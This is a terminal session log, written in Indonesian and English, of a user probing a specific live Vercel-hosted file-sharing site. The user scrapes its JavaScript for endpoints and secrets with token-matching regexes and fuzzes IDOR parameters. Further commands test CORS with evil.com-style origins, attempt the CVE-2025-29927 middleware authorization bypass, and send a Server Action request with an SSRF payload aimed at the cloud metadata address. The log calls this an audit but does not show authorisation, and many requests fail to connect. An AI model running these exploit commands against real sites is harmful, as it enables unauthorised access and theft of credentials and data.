@@ -1,0 +1,826 @@
+pathoskratos@pathos:~$ cd ~/tools/ParamSpider
+python3 paramspider.py -d clouddatadprd.vercel.app \
+  -o ~/Documents/audit-clouddatadprd/api/params.txt
+python3: can't open file '/home/pathoskratos/tools/ParamSpider/paramspider.py': [Errno 2] No such file or directory
+pathoskratos@pathos:~/tools/ParamSpider$ cd ~/tools/ParamSpider
+ls -la
+cat setup.py | grep -A5 entry_points
+cat paramspider --help 2>/dev/null | head -20
+total 52
+drwxrwxr-x  9 pathoskratos pathoskratos 4096 Okt 24 13:45 .
+drwxrwxr-x 15 pathoskratos pathoskratos 4096 Nov  1 23:45 ..
+drwxrwxr-x  4 pathoskratos pathoskratos 4096 Okt 24 13:43 build
+-rw-rw-r--  1 pathoskratos pathoskratos  470 Okt 24 13:43 Dockerfile
+drwxrwxr-x  8 pathoskratos pathoskratos 4096 Okt 24 13:43 .git
+-rw-rw-r--  1 pathoskratos pathoskratos 1070 Okt 24 13:43 LICENSE
+drwxrwxr-x  2 pathoskratos pathoskratos 4096 Okt 24 13:43 paramspider
+drwxrwxr-x  2 pathoskratos pathoskratos 4096 Okt 24 13:44 paramspider.egg-info
+-rw-rw-r--  1 pathoskratos pathoskratos 1727 Okt 24 13:43 README.md
+drwxrwxr-x  2 pathoskratos pathoskratos 4096 Nov  2 05:08 results
+-rw-rw-r--  1 pathoskratos pathoskratos  576 Okt 24 13:43 setup.py
+drwxrwxr-x  2 pathoskratos pathoskratos 4096 Okt 24 13:43 static
+drwxrwxr-x  5 pathoskratos pathoskratos 4096 Okt 24 13:43 .venv
+    entry_points={
+        'console_scripts': [
+            'paramspider = paramspider.main:main'
+        ]
+    },
+    license='MIT',
+Usage: cat [OPTION]... [FILE]...
+Concatenate FILE(s) to standard output.
+
+With no FILE, or when FILE is -, read standard input.
+
+  -A, --show-all           equivalent to -vET
+  -b, --number-nonblank    number nonempty output lines, overrides -n
+  -e                       equivalent to -vE
+  -E, --show-ends          display $ at end of each line
+  -n, --number             number all output lines
+  -s, --squeeze-blank      suppress repeated empty output lines
+  -t                       equivalent to -vT
+  -T, --show-tabs          display TAB characters as ^I
+  -u                       (ignored)
+  -v, --show-nonprinting   use ^ and M- notation, except for LFD and TAB
+      --help        display this help and exit
+      --version     output version information and exit
+
+Examples:
+  cat f - g  Output f's contents, then standard input, then g's contents.
+pathoskratos@pathos:~/tools/ParamSpider$ cd ~/tools/ParamSpider
+pip3 install --user .    # atau: pipx install .
+# Pastikan ~/.local/bin di PATH
+echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
+source ~/.bashrc
+which paramspider
+
+error: externally-managed-environment
+
+× This environment is externally managed
+╰─> To install Python packages system-wide, try apt install
+    python3-xyz, where xyz is the package you are trying to
+    install.
+    
+    If you wish to install a non-Debian-packaged Python package,
+    create a virtual environment using python3 -m venv path/to/venv.
+    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
+    sure you have python3-full installed.
+    
+    If you wish to install a non-Debian packaged Python application,
+    it may be easiest to use pipx install xyz, which will manage a
+    virtual environment for you. Make sure you have pipx installed.
+    
+    See /usr/share/doc/python3.12/README.venv for more information.
+
+note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
+hint: See PEP 668 for the detailed specification.
+pathoskratos@pathos:~/tools/ParamSpider$ 
+pathoskratos@pathos:~/tools/ParamSpider$ cd ~/tools/ParamSpider
+python3 -m paramspider -d clouddatadprd.vercel.app \
+  -o ~/Documents/audit-clouddatadprd/api/params.txt
+# ATAU
+python3 paramspider/__main__.py -d clouddatadprd.vercel.app \
+  -o ~/Documents/audit-clouddatadprd/api/params.txt
+/usr/bin/python3: No module named paramspider.__main__; 'paramspider' is a package and cannot be directly executed
+python3: can't open file '/home/pathoskratos/tools/ParamSpider/paramspider/__main__.py': [Errno 2] No such file or directory
+pathoskratos@pathos:~/tools/ParamSpider$ # Buat wrapper supaya konsisten
+cat > ~/Documents/audit-clouddatadprd/scripts/curl-target.sh <<'EOF'
+#!/usr/bin/env bash
+# Wrapper curl dengan DNS override
+HOST="clouddatadprd.vercel.app"
+IP="${TARGET_IP:-64.29.17.67}"
+exec curl --resolve "$HOST:443:$IP" --resolve "$HOST:80:$IP" "$@"
+EOF
+chmod +x ~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+
+# Test
+~/Documents/audit-clouddatadprd/scripts/curl-target.sh -sS -I https://clouddatadprd.vercel.app/
+
+HTTP/2 200 
+accept-ranges: bytes
+access-control-allow-origin: *
+age: 13369
+cache-control: public, max-age=0, must-revalidate
+content-disposition: inline
+content-type: text/html; charset=utf-8
+date: Wed, 04 Nov 2026 06:06:47 GMT
+etag: "1436578a748c4c4f6a231de60db37c9b"
+permissions-policy: camera=(), microphone=(), geolocation=()
+referrer-policy: strict-origin-when-cross-origin
+server: Vercel
+strict-transport-security: max-age=63072000; includeSubDomains; preload
+vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-matched-path: /
+x-nextjs-prerender: 1
+x-nextjs-stale-time: 300
+x-vercel-cache: HIT
+x-vercel-id: sin1::8x9xq-1793772407348-64fc2c63103a
+content-length: 15221
+
+pathoskratos@pathos:~/tools/ParamSpider$ 
+pathoskratos@pathos:~/tools/ParamSpider$ CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+B="https://clouddatadprd.vercel.app"
+
+# Google Drive file IDs polanya ~33 char alfanumerik
+for id in 1A2b3C4d5E6f7G8h9I0jK1lM2nO3pQ4r5 test invalid 0000 ; do
+  $CURL -sS -o /dev/null -w "fileId=$id → %{http_code}\n" \
+    "$B/api/file?id=$id"
+done | tee api/idor-test.txt
+tee: api/idor-test.txt: No such file or directory
+fileId=1A2b3C4d5E6f7G8h9I0jK1lM2nO3pQ4r5 → 404
+fileId=test → 404
+fileId=invalid → 404
+fileId=0000 → 404
+pathoskratos@pathos:~/tools/ParamSpider$ CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+B="https://clouddatadprd.vercel.app"
+
+for ep in \
+  /api/auth /api/auth/session /api/auth/providers /api/auth/csrf \
+  /api/auth/signin /api/auth/callback /api/auth/signout \
+  /login /register /signin /signup /auth/login /auth/register \
+  /api/login /api/register /api/user /api/users /api/me ; do
+  code=$($CURL -sS -o /dev/null -w '%{http_code}' "$B$ep")
+  size=$($CURL -sS "$B$ep" | wc -c)
+  printf '%-30s %s %s bytes\n' "$ep" "$code" "$size" | tee -a http/auth-routes.txt
+done
+tee: http/auth-routes.txt: No such file or directory
+/api/auth                      404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/api/auth/session              404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/api/auth/providers            404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/api/auth/csrf                 404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/api/auth/signin               404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/api/auth/callback             404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/api/auth/signout              404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/login                         404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/register                      404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/signin                        404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/signup                        404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/auth/login                    404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/auth/register                 404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/api/login                     404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/api/register                  404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/api/user                      404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/api/users                     404 10857 bytes
+tee: http/auth-routes.txt: No such file or directory
+/api/me                        404 10857 bytes
+pathoskratos@pathos:~/tools/ParamSpider$ sudo resolvectl dns wlp1s0 1.1.1.1 8.8.8.8
+sudo resolvectl flush-caches
+# Kembalikan setelah audit: sudo resolvectl revert wlp1s0
+[sudo] password for pathoskratos:         
+pathoskratos@pathos:~/tools/ParamSpider$ cd ~/Documents/audit-clouddatadprd
+mkdir -p http/js
+CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+
+# Ambil homepage dulu (fix path)
+$CURL -sS -L https://clouddatadprd.vercel.app/ -o recon/homepage.html
+
+# Extract semua URL asset
+grep -Eo '/_next/static/[^"]+\.js' recon/homepage.html | sort -u > http/js/list.txt
+grep -Eo '/_next/static/[^"]+\.css' recon/homepage.html | sort -u >> http/js/list.txt
+wc -l http/js/list.txt
+
+# Download semuanya
+while read -r p; do
+  fname="http/js/$(echo "$p" | tr '/' '_')"
+  $CURL -sS "https://clouddatadprd.vercel.app$p" -o "$fname"
+done < http/js/list.txt
+
+ls -lh http/js/
+15 http/js/list.txt
+
+
+pathoskratos@pathos:~/tools/ParamSpider$ cd ~/Documents/audit-clouddatadprd
+mkdir -p api/js-analysis
+
+# ===== A. Semua endpoint API =====
+grep -rEho '"/api/[a-zA-Z0-9_./-]+"' http/js/*.js \
+  | tr -d '"' | sort -u > api/js-analysis/endpoints.txt
+cat api/js-analysis/endpoints.txt
+
+# ===== B. Semua path absolute =====
+grep -rEho '"/[a-zA-Z0-9_-]+(/[a-zA-Z0-9_.-]+)*"' http/js/*.js \
+  | tr -d '"' | sort -u > api/js-analysis/paths.txt
+wc -l api/js-analysis/paths.txt
+
+# ===== C. Fetch / axios / request calls =====
+grep -rEho '(fetch|axios\.[a-z]+|\.get|\.post|\.put|\.delete)\(["'"'"'`][^"'"'"'`]+' http/js/*.js \
+  | sort -u > api/js-analysis/http-calls.txt
+
+# ===== D. Google Drive / Google API refs (KRITIS - tagline "banyak Google Drive") =====
+grep -rEiho '(drive\.google\.com|www\.googleapis\.com|oauth2\.googleapis\.com|/drive/|/file/|/upload/|/download/)[^"'"'"' `)]*' http/js/*.js \
+  | sort -u > api/js-analysis/google-refs.txt
+cat api/js-analysis/google-refs.txt
+
+# ===== E. Hardcoded secrets =====
+grep -rEho 'AIza[0-9A-Za-z_-]{35}' http/js/*.js | sort -u > api/js-analysis/google-api-keys.txt
+grep -rEho 'sk-[A-Za-z0-9]{20,}' http/js/*.js | sort -u > api/js-analysis/openai-keys.txt
+grep -rEho 'ghp_[A-Za-z0-9]{36}' http/js/*.js | sort -u > api/js-analysis/github-tokens.txt
+grep -rEho 'eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}' http/js/*.js | sort -u > api/js-analysis/jwts.txt
+grep -rEho 'SUPABASE_[A-Z_]+|NEXT_PUBLIC_[A-Z0-9_]+|VITE_[A-Z0-9_]+' http/js/*.js | sort -u > api/js-analysis/env-vars.txt
+cat api/js-analysis/env-vars.txt
+
+# ===== F. Server Action IDs (Next.js App Router) =====
+grep -rEho '[0-9a-f]{40,}' http/js/*.js | sort -u | head -100 > api/js-analysis/action-ids.txt
+
+# ===== G. URL eksternal (SSRF surface) =====
+cat api/js-analysis/routes.txt sort -u > api/js-analysis/routes.txtuthorized)[^"]*"' http/js/*.js \
+18 api/js-analysis/paths.txt
+/file/${e}
+NEXT_PUBLIC_API_URL
+https://github.com/zloirock/core-js
+https://github.com/zloirock/core-js/blob/v3.38.1/LICENSE
+https://prosemirror.net/docs/guide/#generatable
+https://react.dev/errors/
+https://web-production-c8591.up.railway.app
+/a/b
+/a/i
+/assignments/my
+/auth/change-password
+/auth/login
+/auth/register
+/conversions/jobs
+/conversions/operations
+/drives/pool
+/drives/refresh-quota
+/files/stats
+/files/upload
+/oauth/google/connect
+/share/create
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/audit-clouddatadprd
+{
+  echo "===== ENDPOINTS ====="
+  cat api/js-analysis/endpoints.txt 2>/dev/null
+  echo -e "\n===== GOOGLE REFS ====="
+  cat api/js-analysis/google-refs.txt 2>/dev/null
+  echo -e "\n===== SECRETS ====="
+  cat api/js-analysis/google-api-keys.txt api/js-analysis/openai-keys.txt \
+      api/js-analysis/github-tokens.txt api/js-analysis/jwts.txt 2>/dev/null
+  echo -e "\n===== ENV VARS ====="
+  cat api/js-analysis/env-vars.txt 2>/dev/null
+  echo -e "\n===== EXTERNAL URLS ====="
+  cat api/js-analysis/external-urls.txt 2>/dev/null
+} | tee report/js-findings.md
+===== ENDPOINTS =====
+
+===== GOOGLE REFS =====
+/file/${e}
+
+===== SECRETS =====
+
+===== ENV VARS =====
+NEXT_PUBLIC_API_URL
+
+===== EXTERNAL URLS =====
+https://github.com/zloirock/core-js
+https://github.com/zloirock/core-js/blob/v3.38.1/LICENSE
+https://prosemirror.net/docs/guide/#generatable
+https://react.dev/errors/
+https://web-production-c8591.up.railway.app
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/audit-clouddatadprd
+
+# Cari file app logic (bukan vendor)
+for f in http/js/*.js; do
+  size=$(stat -c%s "$f")
+  # Cari keyword aplikasi
+  hits=$(grep -cE 'drive|upload|file|dokumen|arsip|login|auth|user' "$f" 2>/dev/null || echo 0)
+  [ "$hits" -gt 0 ] && printf '%-70s %8s bytes %5s hits\n' "$(basename $f)" "$size" "$hits"
+done | sort -k3 -rn
+
+# Fokus ke file yang paling banyak hit
+APP_JS=$(for f in http/js/*.js; do
+  hits=$(grep -cE 'drive|upload|file|dokumen|arsip' "$f" 2>/dev/null || echo 0)
+  echo "$hits $f"
+done | sort -rn | head -1 | cut -d' ' -f2)
+echo "App bundle: $APP_JS"
+
+# Pretty-print untuk baca
+npx prettier --parser babel "$APP_JS" > /tmp/app.pretty.js 2>/dev/null \
+  || python3 -c "import jsbeautifier,sys;print(jsbeautifier.beautify_file(sys.argv[1]))" "$APP_JS" > /tmp/app.pretty.js 2>/dev/null \
+  || cp "$APP_JS" /tmp/app.pretty.js
+wc -l /tmp/app.pretty.js
+bash: [: 0
+0: integer expression expected
+bash: [: 0
+0: integer expression expected
+bash: [: 0
+0: integer expression expected
+__next_static_immutable_chunks_turbopack-1cvbnb3nlabgn.js                 10030 bytes     1 hits
+__next_static_immutable_chunks_3se2njap-g0ob.js                          166366 bytes     1 hits
+__next_static_immutable_chunks_3mw-hrby2crkm.js                          127406 bytes     1 hits
+__next_static_immutable_chunks_3h-55frbe8d0r.js                          766596 bytes     6 hits
+__next_static_immutable_chunks_2apz3jtqratg0.js                          230281 bytes     1 hits
+__next_static_immutable_chunks_1cs_udexqul39.js                           62337 bytes     1 hits
+__next_static_immutable_chunks_1cgyfy_4rnpyi.js                           30725 bytes     1 hits
+__next_static_immutable_chunks_1ae7t663d-y21.js                           27797 bytes     1 hits
+__next_static_immutable_chunks_11tdyw36dsds6.js                           30675 bytes     1 hits
+__next_static_immutable_chunks_0c0hxoamwjsbw.js                          112594 bytes     1 hits
+App bundle: http/js/__next_static_immutable_chunks_3h-55frbe8d0r.js
+
+103 /tmp/app.pretty.js
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+B="https://clouddatadprd.vercel.app"
+
+: > api/cors-matrix.txt
+for origin in "https://evil.com" "null" "https://clouddatadprd.vercel.app" "https://attacker.vercel.app"; do
+  for ep in / /api/user /api/drive /api/files /api/auth/session; do
+    echo "=== Origin: $origin | $ep ===" | tee -a api/cors-matrix.txt
+    $CURL -sS -I -H "Origin: $origin" "$B$ep" \
+      | grep -iE 'access-control|vary' | tee -a api/cors-matrix.txt
+  done
+done
+
+# Cek apakah wildcard + credentials (CRITICAL)
+grep -i 'access-control-allow-credentials: true' api/cors-matrix.txt && \
+  echo "🔴 CRITICAL: wildcard + credentials" || echo "✅ No wildcard+credentials combo"
+=== Origin: https://evil.com | / ===
+access-control-allow-origin: *
+vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+=== Origin: https://evil.com | /api/user ===
+access-control-allow-origin: *
+=== Origin: https://evil.com | /api/drive ===
+access-control-allow-origin: *
+=== Origin: https://evil.com | /api/files ===
+access-control-allow-origin: *
+=== Origin: https://evil.com | /api/auth/session ===
+access-control-allow-origin: *
+=== Origin: null | / ===
+access-control-allow-origin: *
+vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+=== Origin: null | /api/user ===
+access-control-allow-origin: *
+=== Origin: null | /api/drive ===
+access-control-allow-origin: *
+=== Origin: null | /api/files ===
+access-control-allow-origin: *
+=== Origin: null | /api/auth/session ===
+access-control-allow-origin: *
+=== Origin: https://clouddatadprd.vercel.app | / ===
+access-control-allow-origin: *
+vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+=== Origin: https://clouddatadprd.vercel.app | /api/user ===
+access-control-allow-origin: *
+=== Origin: https://clouddatadprd.vercel.app | /api/drive ===
+access-control-allow-origin: *
+=== Origin: https://clouddatadprd.vercel.app | /api/files ===
+access-control-allow-origin: *
+=== Origin: https://clouddatadprd.vercel.app | /api/auth/session ===
+access-control-allow-origin: *
+=== Origin: https://attacker.vercel.app | / ===
+access-control-allow-origin: *
+vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+=== Origin: https://attacker.vercel.app | /api/user ===
+access-control-allow-origin: *
+=== Origin: https://attacker.vercel.app | /api/drive ===
+access-control-allow-origin: *
+=== Origin: https://attacker.vercel.app | /api/files ===
+access-control-allow-origin: *
+=== Origin: https://attacker.vercel.app | /api/auth/session ===
+access-control-allow-origin: *
+✅ No wildcard+credentials combo
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+B="https://clouddatadprd.vercel.app"
+
+: > api/cors-matrix.txt
+for origin in "https://evil.com" "null" "https://clouddatadprd.vercel.app" "https://attacker.vercel.app"; do
+  for ep in / /api/user /api/drive /api/files /api/auth/session; do
+    echo "=== Origin: $origin | $ep ===" | tee -a api/cors-matrix.txt
+    $CURL -sS -I -H "Origin: $origin" "$B$ep" \
+      | grep -iE 'access-control|vary' | tee -a api/cors-matrix.txt
+  done
+done
+
+# Cek apakah wildcard + credentials (CRITICAL)
+grep -i 'access-control-allow-credentials: true' api/cors-matrix.txt && \
+  echo "🔴 CRITICAL: wildcard + credentials" || echo "✅ No wildcard+credentials combo"
+=== Origin: https://evil.com | / ===
+access-control-allow-origin: *
+vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+=== Origin: https://evil.com | /api/user ===
+access-control-allow-origin: *
+=== Origin: https://evil.com | /api/drive ===
+access-control-allow-origin: *
+=== Origin: https://evil.com | /api/files ===
+access-control-allow-origin: *
+=== Origin: https://evil.com | /api/auth/session ===
+access-control-allow-origin: *
+=== Origin: null | / ===
+access-control-allow-origin: *
+vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+=== Origin: null | /api/user ===
+access-control-allow-origin: *
+=== Origin: null | /api/drive ===
+access-control-allow-origin: *
+=== Origin: null | /api/files ===
+access-control-allow-origin: *
+=== Origin: null | /api/auth/session ===
+access-control-allow-origin: *
+=== Origin: https://clouddatadprd.vercel.app | / ===
+access-control-allow-origin: *
+vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+=== Origin: https://clouddatadprd.vercel.app | /api/user ===
+access-control-allow-origin: *
+=== Origin: https://clouddatadprd.vercel.app | /api/drive ===
+access-control-allow-origin: *
+=== Origin: https://clouddatadprd.vercel.app | /api/files ===
+access-control-allow-origin: *
+=== Origin: https://clouddatadprd.vercel.app | /api/auth/session ===
+access-control-allow-origin: *
+=== Origin: https://attacker.vercel.app | / ===
+access-control-allow-origin: *
+vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+=== Origin: https://attacker.vercel.app | /api/user ===
+access-control-allow-origin: *
+=== Origin: https://attacker.vercel.app | /api/drive ===
+access-control-allow-origin: *
+=== Origin: https://attacker.vercel.app | /api/files ===
+access-control-allow-origin: *
+=== Origin: https://attacker.vercel.app | /api/auth/session ===
+access-control-allow-origin: *
+✅ No wildcard+credentials combo
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+B="https://clouddatadprd.vercel.app"
+
+# Baseline: akses /admin tanpa header
+echo "===== BASELINE ====="
+for p in /admin /dashboard /files /drive /api/user /api/admin; do
+  code=$($CURL -sS -o /dev/null -w '%{http_code}' "$B$p")
+  echo "$p → $code"
+done
+
+# Bypass CVE-2025-29927
+echo "===== BYPASS CVE-2025-29927 ====="
+for bypass in \
+  "middleware" \
+  "middleware:middleware" \
+  "middleware:middleware:middleware:middleware:middleware" \
+  "src/middleware" \
+  "src/middleware:src/middleware" \
+  "pages/_middleware" ; do
+  echo "--- x-middleware-subrequest: $bypass ---"
+  for p in /admin /dashboard /files /drive /api/admin; do
+    code=$($CURL -sS -o /dev/null -w '%{http_code}' \
+      -H "x-middleware-subrequest: $bypass" "$B$p")
+    printf '  %-20s → %s\n' "$p" "$code"
+  done
+done | tee api/cve-2025-29927.txt
+===== BASELINE =====
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+/admin → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+/dashboard → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+/files → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+/drive → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+/api/user → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+/api/admin → 000
+===== BYPASS CVE-2025-29927 =====
+--- x-middleware-subrequest: middleware ---
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /admin               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /dashboard           → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /files               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /drive               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /api/admin           → 000
+--- x-middleware-subrequest: middleware:middleware ---
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /admin               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /dashboard           → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /files               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /drive               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /api/admin           → 000
+--- x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware ---
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /admin               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /dashboard           → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /files               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /drive               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /api/admin           → 000
+--- x-middleware-subrequest: src/middleware ---
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /admin               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /dashboard           → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /files               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /drive               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /api/admin           → 000
+--- x-middleware-subrequest: src/middleware:src/middleware ---
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /admin               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /dashboard           → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /files               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /drive               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /api/admin           → 000
+--- x-middleware-subrequest: pages/_middleware ---
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /admin               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /dashboard           → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /files               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /drive               → 000
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+  /api/admin           → 000
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+B="https://clouddatadprd.vercel.app"
+
+# Ambil Server Action ID dari JS (biasanya 40+ hex char)
+cat api/js-analysis/action-ids.txt | head -20
+
+# Test salah satu ID dengan Next-Action header
+ACTION_ID=$(head -1 api/js-analysis/action-ids.txt)
+echo "Testing Action ID: $ACTION_ID"
+
+$CURL -sS -X POST "$B/" \
+  -H "Next-Action: $ACTION_ID" \
+  -H "Content-Type: multipart/form-data; boundary=----x" \
+  --data-binary $'------x\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"url":"http://169.254.169.254/latest/meta-data/"}\r\n------x--' \
+  -w '\n[HTTP %{http_code}]\n' \
+  -o api/action-test-response.txt
+head -50 api/action-test-response.txt
+Testing Action ID: 
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+
+[HTTP 000]
+head: cannot open 'api/action-test-response.txt' for reading: No such file or directory
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+B="https://clouddatadprd.vercel.app"
+
+# Gabung semua kandidat endpoint
+cat api/js-analysis/endpoints.txt api/js-analysis/google-refs.txt 2>/dev/null \
+  | grep -E '/api|/drive|/file' | sort -u > api/drive-candidates.txt
+cat api/drive-candidates.txt
+
+# Test setiap endpoint — GET tanpa auth
+: > api/endpoint-auth-matrix.txt
+while read -r ep; do
+  [ -z "$ep" ] && continue
+  # Normalize
+  ep="/$(echo "$ep" | sed 's|^/||')"
+  for m in GET POST OPTIONS; do
+    code=$($CURL -sS -o /dev/null -w '%{http_code}' -X "$m" "$B$ep")
+    allow=$($CURL -sS -I -X OPTIONS "$B$ep" | grep -i '^allow:' | tr -d '\r' || true)
+    printf '%-40s %-7s %s %s\n' "$ep" "$m" "$code" "$allow" | tee -a api/endpoint-auth-matrix.txt
+  done
+done < api/drive-candidates.txt
+/file/${e}
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+/file/${e}                               GET     000 
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+/file/${e}                               POST    000 
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+curl: (7) Failed to connect to clouddatadprd.vercel.app port 443 after 0 ms: Couldn't connect to server
+/file/${e}                               OPTIONS 000 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+B="https://clouddatadprd.vercel.app"
+
+# Parameter yang sering IDOR
+PARAMS=("id" "fileId" "driveId" "folderId" "userId" "docId" "uuid")
+VALUES=("1" "0" "admin" "test" "1A2b3C4d5E6f7G8h9I0jK1lM2nO3pQ4r5" "00000000")
+
+: > api/idor-matrix.txt
+while read -r ep; do
+  [ -z "$ep" ] && continue
+  ep="/$(echo "$ep" | sed 's|^/||')"
+  for param in "${PARAMS[@]}"; do
+    for val in "${VALUES[@]}"; do
+      code=$($CURL -sS -o /dev/null -w '%{http_code}' "$B$ep?$param=$val")
+      [ "$code" != "404" ] && [ "$code" != "000" ] && \
+        printf '%-35s %s=%s → %s\n' "$ep" "$param" "$val" "$code" | tee -a api/idor-matrix.txt
+    done
+  done
+done < api/drive-candidates.txt
+
+
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+B="https://clouddatadprd.vercel.app"
+
